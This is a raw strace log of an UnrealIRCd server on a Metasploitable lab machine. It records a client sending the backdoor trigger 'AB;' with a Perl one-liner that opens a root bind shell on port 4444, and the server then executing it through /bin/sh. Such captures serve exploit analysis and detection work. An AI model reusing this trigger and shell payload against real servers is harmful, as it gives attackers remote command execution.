4519  07:33:34.745252 select(1024, [2 3 4 7 9], [], NULL, {0, 800000}) = 1 (in [2], left {0, 620000})
4519  07:33:34.929949 clock_gettime(CLOCK_MONOTONIC, {2424, 746982747}) = 0
4519  07:33:34.929983 time(NULL)        = 1495625614
4519  07:33:34.929993 time(NULL)        = 1495625614
4519  07:33:34.930005 gettimeofday({1495625614, 930009}, NULL) = 0
4519  07:33:34.930017 select(1024, [2], [], NULL, {0, 0}) = 1 (in [2], left {0, 0})
4519  07:33:34.930055 clock_gettime(CLOCK_MONOTONIC, {2424, 747068358}) = 0
4519  07:33:34.930066 gettimeofday({1495625614, 930069}, NULL) = 0
4519  07:33:34.930076 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [2], left {1, 0})
4519  07:33:34.930114 clock_gettime(CLOCK_MONOTONIC, {2424, 747127032}) = 0
4519  07:33:34.930125 accept(2, 0, NULL) = 5
4519  07:33:34.930145 getpeername(5, {sa_family=AF_INET, sin_port=htons(38659), sin_addr=inet_addr("10.0.2.4")}, [16]) = 0
4519  07:33:34.930174 fcntl64(5, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:33:34.930186 fcntl64(5, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:33:34.930199 setsockopt(5, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
4519  07:33:34.930211 setsockopt(5, SOL_SOCKET, SO_RCVBUF, [8192], 4) = 0
4519  07:33:34.930222 setsockopt(5, SOL_SOCKET, SO_SNDBUF, [8192], 4) = 0
4519  07:33:34.930233 getsockopt(5, SOL_IP, IP_OPTIONS, "", [0]) = 0
4519  07:33:34.930266 setsockopt(5, SOL_IP, IP_OPTIONS, NULL, 0) = 0
4519  07:33:34.930429 clock_gettime(CLOCK_MONOTONIC, {2424, 747460110}) = 0
4519  07:33:34.930459 socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 6
4519  07:33:34.930472 fcntl64(6, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:33:34.930495 fcntl64(6, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:33:34.930505 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
4519  07:33:34.930515 connect(6, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, 16) = 0
4519  07:33:34.930531 send(6, "\304\245\1\0\0\1\0\0\0\0\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1", 39, MSG_NOSIGNAL) = 39
4519  07:33:34.930647 accept(2, 0, NULL) = -1 EAGAIN (Resource temporarily unavailable)
4519  07:33:34.930684 send(5, ":irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\r\n", 70, 0) = 70
4519  07:33:34.930766 gettimeofday({1495625614, 930771}, NULL) = 0
4519  07:33:34.930795 select(1024, [2 3 4 6 7 9], [], NULL, {1, 0}) = 1 (in [6], left {0, 990000})
4519  07:33:34.936202 clock_gettime(CLOCK_MONOTONIC, {2424, 753241005}) = 0
4519  07:33:34.936241 recvfrom(6, "\304\245\201\203\0\1\0\0\0\1\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1\300\22\0\6\0\1\0\0\1\0\0A\10prisoner\4iana\3org\0\nhostmaster\froot-servers\300AwsD\225\0\0\7\10\0\0\3\204\0\t:\200\0\t:\200", 513, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, [16]) = 116
4519  07:33:34.936296 close(6)          = 0
4519  07:33:34.936312 recvfrom(-1, 0xbfbaddf7, 513, 0, 0xbfbadff8, 0xbfbaddf0) = -1 EBADF (Bad file descriptor)
4519  07:33:34.936327 send(5, ":irc.Metasploitable.LAN NOTICE AUTH :*** Couldn\'t resolve your hostname; using your IP address instead\r\n", 104, 0) = 104
4519  07:33:34.936410 time(NULL)        = 1495625614
4519  07:33:34.936438 time(NULL)        = 1495625614
4519  07:33:34.936450 gettimeofday({1495625614, 936454}, NULL) = 0
4519  07:33:34.936463 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:33:34.936493 clock_gettime(CLOCK_MONOTONIC, {2424, 753505997}) = 0
4519  07:33:34.936517 gettimeofday({1495625614, 936520}, NULL) = 0
4519  07:33:34.936528 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [5], left {1, 0})
4519  07:33:34.936568 clock_gettime(CLOCK_MONOTONIC, {2424, 753580742}) = 0
4519  07:33:34.936579 recv(5, "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n", 8192, 0) = 244
4519  07:33:34.936608 rt_sigaction(SIGINT, {SIG_IGN}, {0x8062280, [HUP INT], 0}, 8) = 0
4519  07:33:34.936629 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
4519  07:33:34.936641 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
4519  07:33:34.936665 clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbfbae034) = 10560
10560 07:33:34.936734 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
10560 07:33:34.936749 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
10560 07:33:34.936760 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10560 07:33:34.936774 execve("/bin/sh", ["sh", "-c", "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n"], [/* 14 vars */]) = 0
10560 07:33:34.936916 brk(0)            = 0x80f9000
10560 07:33:34.936956 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10560 07:33:34.936973 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f5b000
10560 07:33:34.936990 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
10560 07:33:34.937008 open("/etc/ld.so.cache", O_RDONLY) = 1
10560 07:33:34.937021 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
10560 07:33:34.937040 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f53000
10560 07:33:34.937051 close(1)          = 0
10560 07:33:34.937062 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10560 07:33:34.937077 open("/lib/libncurses.so.5", O_RDONLY) = 1
10560 07:33:34.937091 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220\0\0004\0\0\0h\344\2\0\0\0\0\0004\0 \0\4\0(\0\32\0\31\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0T\305\2\0T\305\2\0\5\0\0\0\0\20\0\0\1\0\0\0T\305\2\0T\325\2\0T\325\2\0004\36\0\0 \"\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\335\2\0\34\355\2\0\34\355\2\0\330\0\0\0\330\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\t\2\0\0&\2\0\0z\1\0\0L\0\0\0\0\0\0\0\0\0\0\0\25\0\0\0\333\1\0\0\0\0\0\0\0\0\0\0\t\2\0\0\20\2\0\0E\1\0\0\0\0\0\0\0\0\0\0T\0\0\0\367\1\0\0\0\0\0\0\0\0\0\0\306\1\0\0L\1\0\0\203\0\0\0\236\1\0\0\0\0\0\0\0\0\0\0\320\0\0\0005\0\0\0\233\1\0\0\375\0\0\0\265\0\0\0\0\0\0\0\267\0\0\0\0\0\0\0\246\1\0\0\33\1\0\0\300\1\0\0\356\0\0\0\223\0\0\0@\1\0\0\365\1\0\0\23\2\0\0O\0\0\0\303\1\0\0\0\0\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\225\0\0\0|\0\0\0\0\0\0\0x\0\0\0\364\1\0\0\0\0\0\0\21\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0^\1\0\0\0\0\0\0\22\2\0\0\0\0\0\0\371\0\0\0\33\0\0\0f\0\0\0\37\1\0\0\222\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\354\0\0\0\261\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\36\2\0\0\0\0\0\0\5\0\0\0\364\0\0\0\0\0\0\0R\0\0\0", 512) = 512
10560 07:33:34.937186 fstat64(1, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
10560 07:33:34.937204 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f23000
10560 07:33:34.937216 mmap2(0xb7f50000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x2c) = 0xb7f50000
10560 07:33:34.937233 close(1)          = 0
10560 07:33:34.937245 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10560 07:33:34.937259 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
10560 07:33:34.937274 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
10560 07:33:34.937381 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
10560 07:33:34.937400 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f1f000
10560 07:33:34.937411 mmap2(0xb7f21000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f21000
10560 07:33:34.937428 close(1)          = 0
10560 07:33:34.937440 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10560 07:33:34.937454 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
10560 07:33:34.937468 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
10560 07:33:34.937557 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
10560 07:33:34.937574 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f1e000
10560 07:33:34.937588 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dcf000
10560 07:33:34.937599 mmap2(0xb7f18000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f18000
10560 07:33:34.937614 mmap2(0xb7f1b000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f1b000
10560 07:33:34.937628 close(1)          = 0
10560 07:33:34.937650 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7dce000
10560 07:33:34.937662 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7dce6b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
10560 07:33:34.937718 mprotect(0xb7f18000, 4096, PROT_READ) = 0
10560 07:33:34.937755 munmap(0xb7f53000, 29913) = 0
10560 07:33:34.937780 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
10560 07:33:34.937794 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
10560 07:33:34.937814 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfba1560) = -1 ENOTTY (Inappropriate ioctl for device)
10560 07:33:34.937845 brk(0)            = 0x80f9000
10560 07:33:34.937866 brk(0x80fa000)    = 0x80fa000
10560 07:33:34.937907 brk(0x80fb000)    = 0x80fb000
10560 07:33:34.937924 getuid32()        = 0
10560 07:33:34.937948 getgid32()        = 0
10560 07:33:34.937957 geteuid32()       = 0
10560 07:33:34.937966 getegid32()       = 0
10560 07:33:34.937980 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
10560 07:33:34.937994 time(NULL)        = 1495625614
10560 07:33:34.938007 brk(0x80fc000)    = 0x80fc000
10560 07:33:34.938022 brk(0x80fd000)    = 0x80fd000
10560 07:33:34.938041 open("/proc/meminfo", O_RDONLY) = 1
10560 07:33:34.938063 fstat64(1, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
10560 07:33:34.938081 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f5a000
10560 07:33:34.938093 read(1, "MemTotal:      1035240 kB\nMemFree:        409432 kB\nBuffers:         78104 kB\nCached:         388192 kB\nSwapCached:          0 kB\nActive:         256496 kB\nInactive:       338724 kB\nHighTotal:      131008 kB\nHighFree:          240 kB\nLowTotal:       904232 kB\nLowFree:        409192 kB\nSwapTotal:           0 kB\nSwapFree:            0 kB\nDirty:            5372 kB\nWriteback:           0 kB\nAnonPages:      128976 kB\nMapped:          52008 kB\nSlab:            19316 kB\nSReclaimable:    10736 kB\nSUnreclaim:       8580 kB\nPageTables:       1972 kB\nNFS_Unstable:        0 kB\nBounce:              0 kB\nCommitLimit:    517620 kB\nCommitted_AS:   635396 kB\nVmallocTotal:   118776 kB\nVmallocUsed:      3420 kB\nVmallocChunk:   114760 kB\nHugePages_Total:     0\nHugePages_Free:      0\nHugePages_Rsvd:      0\nHugePages_Surp:      0\nHugepagesize:     2048 kB\n", 1024) = 846
10560 07:33:34.938181 close(1)          = 0
10560 07:33:34.938193 munmap(0xb7f5a000, 4096) = 0
10560 07:33:34.938205 brk(0x80fe000)    = 0x80fe000
10560 07:33:34.938233 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
10560 07:33:34.938246 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
10560 07:33:34.938259 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
10560 07:33:34.938271 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
10560 07:33:34.938283 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
10560 07:33:34.938295 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
10560 07:33:34.938308 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
10560 07:33:34.938320 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
10560 07:33:34.938333 uname({sys="Linux", node="metasploitable", ...}) = 0
10560 07:33:34.938445 stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10560 07:33:34.938464 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
10560 07:33:34.938482 brk(0x8100000)    = 0x8100000
10560 07:33:34.938494 getcwd("/etc/unreal", 4096) = 12
10560 07:33:34.938509 getpid()          = 10560
10560 07:33:34.938526 getppid()         = 4519
10560 07:33:34.938541 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
10560 07:33:34.938561 stat64("/sbin/sh", 0xbfba1538) = -1 ENOENT (No such file or directory)
10560 07:33:34.938574 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
10560 07:33:34.938591 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
10560 07:33:34.938615 socket(PF_FILE, SOCK_STREAM, 0) = 1
10560 07:33:34.938628 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
10560 07:33:34.938640 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
10560 07:33:34.938661 close(1)          = 0
10560 07:33:34.938673 socket(PF_FILE, SOCK_STREAM, 0) = 1
10560 07:33:34.938683 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
10560 07:33:34.938693 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
10560 07:33:34.938712 close(1)          = 0
10560 07:33:34.938725 open("/etc/nsswitch.conf", O_RDONLY) = 1
10560 07:33:34.938739 fstat64(1, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
10560 07:33:34.938756 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f5a000
10560 07:33:34.938767 read(1, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
10560 07:33:34.938816 read(1, "", 4096) = 0
10560 07:33:34.938826 close(1)          = 0
10560 07:33:34.938835 munmap(0xb7f5a000, 4096) = 0
10560 07:33:34.938862 open("/etc/ld.so.cache", O_RDONLY) = 1
10560 07:33:34.938904 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
10560 07:33:34.938921 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f53000
10560 07:33:34.938949 close(1)          = 0
10560 07:33:34.938959 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10560 07:33:34.938975 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 1
10560 07:33:34.938990 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\0004\0\0\0\204r\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0001a\0\0001a\0\0001a\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274c\0\0\274c\0\0\5\0\0\0\0\20\0\0\1\0\0\0\340n\0\0\340~\0\0\340~\0\0\250\2\0\0h\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\364n\0\0\364~\0\0\364~\0\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\340n\0\0\340~\0\0\340~\0\0\24\1\0\0\24\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\32\0\0\0&\0\0\0\4\0\0\0\7\0\0\0Q\0\200\2@\t\21\r\0\4\33\200\21H\262\201&\0\0\0\'\0\0\0(\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0)\0\0\0*\0\0\0+\0\0\0\0\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0\0\0\0\0\0\0\0\0002\0\0\0\0\0\0\0003\0\0\0004\0\0\0\0\0\0\0005\0\0\0\207[\246\22\365\33=\274\365\365K\23\0012\310%;]^\2674\10\301\346\357\37>\346\312\271\330\2749\303M%", 512) = 512
10560 07:33:34.939080 fstat64(1, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
10560 07:33:34.939098 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dc5000
10560 07:33:34.939109 mmap2(0xb7dcc000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x6) = 0xb7dcc000
10560 07:33:34.939127 close(1)          = 0
10560 07:33:34.939139 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10560 07:33:34.939152 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 1
10560 07:33:34.939167 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\0004\0\0\0\234B\1\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340,\1\0\340,\1\0\340,\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\3407\1\0\3407\1\0\5\0\0\0\0\20\0\0\1\0\0\0\300>\1\0\300N\1\0\300N\1\0\350\2\0\0()\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\300>\1\0\300N\1\0\300N\1\0004\1\0\0004\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\374\0\0\0q\0\0\0 \0\0\0\n\0\0\0\1\1$\232 \'Q\0@ \0\0\f\1\1\n\1\n\0\0\240:X\0@\1\16$\10\4\200\n`\260\23 @\24\21\20@\3442\324\4H\346\0\1`\3@\260\272\2019\30\235\340\0\0\332\200\0044\2\201J\20{\203+\200\22 d\21\1\0\2\200\306 d`A\n\4\4\4\v\4PD@\200\20\0\22 \4\340@\1\32 \4\2\20\10\0\0\204\260\200\0\340\23\0\212$\0\206\210\0\2`@q\0\0\0\0\0\0\0\0\0\0\0r\0\0\0\0\0\0\0t\0\0\0\0\0\0\0", 512) = 512
10560 07:33:34.939255 fstat64(1, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
10560 07:33:34.939272 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dad000
10560 07:33:34.939283 mmap2(0xb7dc1000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7dc1000
10560 07:33:34.939299 mmap2(0xb7dc3000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7dc3000
10560 07:33:34.939313 close(1)          = 0
10560 07:33:34.939349 munmap(0xb7f53000, 29913) = 0
10560 07:33:34.939395 open("/etc/ld.so.cache", O_RDONLY) = 1
10560 07:33:34.939409 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
10560 07:33:34.939442 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f53000
10560 07:33:34.939452 close(1)          = 0
10560 07:33:34.939463 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10560 07:33:34.939478 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 1
10560 07:33:34.939493 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0\0004\0\0\0\320\201\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\350x\0\0\350x\0\0\350x\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\310}\0\0\310}\0\0\5\0\0\0\0\20\0\0\1\0\0\0\334~\0\0\334\216\0\0\334\216\0\0\374\1\0\0`\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360~\0\0\360\216\0\0\360\216\0\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334~\0\0\334\216\0\0\334\216\0\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0g\0\0\0000\0\0\0\20\0\0\0\t\0\0\0\2\0\0H  \26\20\0\0@g\3\0\3\6\30\24\0248A\30&\243\301\200\212\0048\21\10 B@\310\24\344\20\311\244\10\0\4\0\0@\0P!\0\0\204\0\0\0\0@\v\0y\243\0D\202\0\0\0\0000\0\0\0001\0\0\0\0\0\0\0002\0\0\0003\0\0\0004\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0005\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0006\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
